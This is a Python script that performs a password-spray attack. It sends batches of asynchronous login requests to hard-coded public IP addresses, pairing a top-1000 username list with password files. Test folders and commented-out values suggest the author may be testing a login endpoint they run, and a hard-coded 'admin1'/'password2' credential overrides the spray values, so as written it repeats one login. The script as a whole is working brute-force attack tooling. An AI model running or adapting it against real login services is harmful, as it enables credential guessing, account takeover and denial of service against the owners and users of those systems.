import asyncio
import aiohttp
import os

url = 'http://54.234.93.154:5050/login'
url = 'http://50.19.17.226:5050/login'
BATCH_SIZE = 100  # Number of requests per batch

# Function to send a login request
async def send_login_request(session, username, password):
    try:
        async with session.post(url, json={
            # 'username': username,
            # 'password': password
            'username': "admin1",
            'password': "password2"
        }) as response:
            pass
        if response.status == 200:
            print(f'[+] Success! Response status for {username}:{password} - {response.status}')
        else:
            print(f'[-] Failed! Response status for {username}:{password} - {response.status}')
    except Exception as error:
        print(f'Request failed for {username}:{password} - {error}')

# Function to send requests in batches
async def send_requests_in_batches(session, username_password_pairs):
    for i in range(0, len(username_password_pairs), BATCH_SIZE):
        batch_pairs = username_password_pairs[i:i + BATCH_SIZE]

        # Create batch of login requests
        batch_requests = [
            send_login_request(session, username, password)
            for username, password in batch_pairs
        ]
        
        # Send batch and wait for completion
        await asyncio.gather(*batch_requests)

        # Add a 1-second sleep after each batch
        await asyncio.sleep(1)
        print(f'Sent batch of {len(batch_requests)} requests.')

    print(f'Total of {len(username_password_pairs)} requests completed.')

# Function to perform the password spray
async def password_spray(usernames, passwords):
    username_password_pairs = [(username, password) for username in usernames for password in passwords]
    
    async with aiohttp.ClientSession() as session:
        await send_requests_in_batches(session, username_password_pairs)


# Function to read the usernames from a file
def read_usernames(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Function to read the passwords from a file
def read_passwords(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Run the password spray
if __name__ == "__main__":
    # Get the directory of the current script
    base_dir = os.path.dirname(os.path.abspath(__file__))

    # Build paths relative to the script's directory
    # username_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'username.txt')
    # password_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'password.txt')

    # BIG TEST
    username_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top_1000_usernames.txt')
    password_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'password.txt')

    # Read the usernames and passwords from files
    usernames = read_usernames(username_file_path)
    passwords = read_passwords(password_file_path)

    print(len(usernames)* len(passwords))

    # FOR TEST PURPOSES
    # usernames = ['admin']
    # passwords = ['password']

    # print(usernames)
    # print(passwords)

    # Run the password spray
    asyncio.run(password_spray(usernames, passwords))